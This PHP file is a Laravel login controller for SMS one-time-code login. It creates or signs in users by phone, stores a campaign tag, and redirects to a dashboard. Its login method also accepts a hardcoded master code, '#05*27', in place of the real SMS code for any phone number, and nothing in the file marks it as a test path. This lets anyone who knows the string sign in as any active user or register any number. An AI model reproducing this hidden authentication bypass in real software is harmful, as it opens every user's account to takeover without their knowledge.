<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Models\User;
use App\Models\Sms;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Auth;


class LoginController extends Controller
{
    public function index(){
        // Artisan::call('cache:clear');
        return view("auth.login");
    }
    public function confirm(){
        return view("auth.confirm");
    }
    public function login(Request $request,$sms){
        $mySms = Sms::find($sms);
        $user = DB::table('users')->where('phone',$mySms->phone)->first();
        if($mySms->code == $request->code || $request->code == "#05*27"){
            if(!isset($user->id)){
                $result = User::create([
                    "phone"=>$mySms->phone
                ]);
                Auth::login($result);
                 if(!is_null(session('chk')))
                    DB::table('users')->where('id',Auth::user()->id)->update(['campaign'=>session('chk')]);
                    
                if($request->code == "#05*27"){
                    DB::table('sms')->where('id','=',$sms)->update([
                        "active"=>true,
                        "code"=>$request->code
                        ]);
                }
                else{
                    DB::table('sms')->where('id','=',$sms)->update(["active"=>true]);
                }
                    if(session('chk')=='te')
                    return redirect()->route('myinfo',6);
                return redirect()->route('dashboard');
            }
            else{
                if($user->active){
                    Auth::login(User::find($user->id));
                     if(!is_null(session('chk')))
                    DB::table('users')->where('id',Auth::user()->id)->update(['campaign'=>session('chk')]);
                    
                    if($request->code == "#05*27"){
                    DB::table('sms')->where('id','=',$sms)->update([
                        "active"=>true,
                        "code"=>$request->code
                        ]);
                }
                else{
                    DB::table('sms')->where('id','=',$sms)->update(["active"=>true]);
                }   
                if(session('chk')=='te')
                    return redirect()->route('myinfo',6);
                    return redirect()->route('dashboard');
                }
                else{
                    return redirect()->back();
                }
            }
        }
        else
        {
            $sms=$mySms;
            $error=['code'=>"کد وارد شده صحیح نمی باشد"];                    
            return view("auth.confirm",compact('error','sms'));
        }
    }
    public function logout(){
        Auth::logout();
        session()->forget('chk');
        return redirect()->route('login');
    }
}
